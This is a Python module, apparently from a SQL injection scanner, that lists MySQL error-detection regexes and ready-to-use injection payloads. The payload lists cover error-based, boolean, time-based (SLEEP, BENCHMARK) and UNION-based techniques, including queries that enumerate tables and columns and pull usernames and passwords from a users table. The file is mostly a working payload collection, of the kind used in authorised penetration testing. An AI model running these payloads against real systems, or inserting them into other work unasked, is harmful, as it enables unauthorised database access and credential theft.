#!/usr/bin/env python3
"""
MySQL Specific Payloads for SQL Injection
"""

# MySQL error patterns
MYSQL_ERROR_PATTERNS = [
    # MySQL specific errors
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySqlException \(0x",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
    r"MySqlClient\.",
    r"com\.mysql\.jdbc\.exceptions",
    r"Unclosed quotation mark after the character string",
    r"You have an error in your SQL syntax",
    r"Unexpected end of command in statement",
    r"Column count doesn't match value count at row",
    r"Table '[^']+' doesn't exist",
    r"Unknown column '[^']+' in 'field list'",
    r"MySQL server version for the right syntax to use",
    r"Division by zero in SQL statement",
    r"Incorrect syntax near",
    r"1064: You have an error in your SQL syntax",
    r"SQL syntax.*MariaDB server",
    r"Duplicate column name"
]

# MySQL error-based payloads
MYSQL_ERROR_PAYLOADS = [
    # Standard error-based payloads
    "'",
    "\"",
    "' OR 1=1 -- -",
    "\" OR 1=1 -- -",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"1\"=\"1",
    "' OR 1=1#",
    "\" OR 1=1#",
    "' OR 1=1/*",
    "\" OR 1=1/*",
    # MySQL specific errors
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) -- -",
    "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1) -- -",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT user()), 0x7e, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y) -- -",
    "' AND (SELECT * FROM (SELECT(SLEEP(0)))')'",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95,33,64,48,100,95),1,FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1) -- -",
    "' AND (SELECT 2 FROM (SELECT COUNT(*),CONCAT(CHAR(95,33,64,48,100,95),1,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y) -- -",
    "' AND EXTRACTVALUE(9876,CONCAT(0x5c,(SELECT MID(VERSION(),1,255)))) -- -",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION(),0x7e)) USING utf8))) -- -",
    "' AND JSON_EXTRACT('{\"a\": 1}', CONCAT('$.',VERSION())) -- -"
]

# MySQL boolean-based payloads
MYSQL_BOOLEAN_PAYLOADS = [
    "' AND 1=1 -- -",
    "' AND 1=0 -- -",
    "\" AND 1=1 -- -",
    "\" AND 1=0 -- -",
    "' AND 'x'='x' -- -",
    "' AND 'x'='y' -- -",
    "\" AND \"x\"=\"x\" -- -",
    "\" AND \"x\"=\"y\" -- -",
    "' AND ASCII(SUBSTRING((SELECT database()), 1, 1)) > 96 -- -",
    "' AND LENGTH(database()) > 0 -- -"
]

# MySQL time-based payloads
MYSQL_TIME_PAYLOADS = [
    "' AND SLEEP(2) -- -",
    "\" AND SLEEP(2) -- -",
    "' AND BENCHMARK(20,MD5(1)) -- -",
    "\" AND BENCHMARK(20,MD5(1)) -- -",
    "') AND SLEEP(2) -- -",
    "\") AND SLEEP(2) -- -",
    "' OR SLEEP(2) -- -",
    "\" OR SLEEP(2) -- -",
    "' AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- -",
    "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- -"
]

# MySQL union-based payloads
MYSQL_UNION_PAYLOADS = [
    # Column enumeration
    "' UNION SELECT NULL -- -",
    "' UNION SELECT NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL,NULL -- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -",
    # Data extraction
    "' UNION SELECT 1,2,3,4,5 -- -",
    "' UNION SELECT 1,2,3,4,5,6 -- -",
    "' UNION SELECT 1,2,3,4,5,6,7 -- -",
    "' UNION SELECT 1,2,3,4,5,6,7,8 -- -",
    # Database info extraction
    "' UNION SELECT version(),2,3,4 -- -",
    "' UNION SELECT 1,user(),3,4 -- -",
    "' UNION SELECT 1,database(),3,4 -- -",
    # Table enumeration
    "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 -- -",
    "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1 -- -",
    # Column enumeration
    "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' LIMIT 1 -- -",
    "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' LIMIT 1,1 -- -",
    # Data extraction with GROUP_CONCAT
    "' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database() -- -",
    "' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users' -- -",
    "' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users -- -"
]


def get_mysql_error_patterns():
    """
    Get MySQL specific error patterns for SQL injection detection

    Returns:
        list: List of regex patterns for MySQL error detection
    """
    return MYSQL_ERROR_PATTERNS


def get_mysql_error_payloads():
    """
    Get MySQL specific error-based payloads

    Returns:
        list: List of error-based payloads for MySQL
    """
    return MYSQL_ERROR_PAYLOADS


def get_mysql_boolean_payloads():
    """
    Get MySQL specific boolean-based payloads

    Returns:
        list: List of boolean-based payloads for MySQL
    """
    return MYSQL_BOOLEAN_PAYLOADS


def get_mysql_time_payloads():
    """
    Get MySQL specific time-based payloads

    Returns:
        list: List of time-based payloads for MySQL
    """
    return MYSQL_TIME_PAYLOADS


def get_mysql_union_payloads():
    """
    Get MySQL specific union-based payloads

    Returns:
        list: List of union-based payloads for MySQL
    """
    return MYSQL_UNION_PAYLOADS
